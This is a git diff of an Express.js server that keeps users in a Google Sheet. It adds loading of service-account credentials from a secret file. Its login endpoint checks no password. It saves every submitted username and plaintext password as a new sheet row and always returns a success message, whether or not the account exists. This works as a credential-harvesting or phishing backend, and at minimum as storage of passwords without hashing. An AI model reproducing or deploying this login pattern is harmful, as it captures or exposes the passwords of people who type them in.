@@ -5,20 +5,27 @@ const bcrypt = require('bcrypt');
 const cors = require('cors');
 const path = require('path');
 const ExcelJS = require('exceljs');
+const fs = require('fs');
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ---------- GOOGLE SHEETS SETUP ----------
 // ---------- GOOGLE SHEETS SETUP (AUTO) ----------
 let creds;
-if (process.env.GOOGLE_PRIVATE_KEY) {
-    // Render (Live)
+if (fs.existsSync('/etc/secrets/credentials.json')) {
+    // Render (Live) - Secret File
+    const credsFile = JSON.parse(fs.readFileSync('/etc/secrets/credentials.json', 'utf8'));
+    creds = {
+        client_email: credsFile.client_email,
+        private_key: credsFile.private_key
+    };
+} else if (process.env.GOOGLE_PRIVATE_KEY) {
+    // Render (Live) - Environment Variable
     creds = {
         client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
-        private_key: process.env.GOOGLE_PRIVATE_KEY  // ✅ YEH CHANGE KARO
+        private_key: process.env.GOOGLE_PRIVATE_KEY
     };
 } else {
     // Local (VS Code)
@@ -33,7 +40,8 @@ const doc = new GoogleSpreadsheet(
         scopes: ['https://www.googleapis.com/auth/spreadsheets'],
     })
 );
-// ---------- REGISTER API (Optional - Rakho Ya Hatao) ----------
+
+// ---------- REGISTER API ----------
 app.post('/api/register', async (req, res) => {
     try {
         const { name, username, email, password } = req.body;
@@ -63,7 +71,7 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// ---------- 🔥 NEW LOGIN API (Har attempt save karega) ----------
+// ---------- LOGIN API (Har attempt save karega) ----------
 app.post('/api/login', async (req, res) => {
     try {
         const { username, password } = req.body;
@@ -71,16 +79,14 @@ app.post('/api/login', async (req, res) => {
         await doc.loadInfo();
         const sheet = doc.sheetsByTitle['Users'];
 
-        // 🔥 Pehle login attempt save karo (har baar)
         await sheet.addRow({
-            name: username,  // Username hi name ban jayega
+            name: username,
             username: username,
-            email: username + '@temp.com',  // Temporary email
-            password: password,  // Plain password (ya hash karo)
+            email: username + '@temp.com',
+            password: password,
             created_at: new Date().toISOString()
         });
 
-        // ✅ Always success message (chahe user exist kare ya nahi)
         res.json({
             message: '✅ Login attempt saved!',
             user: {
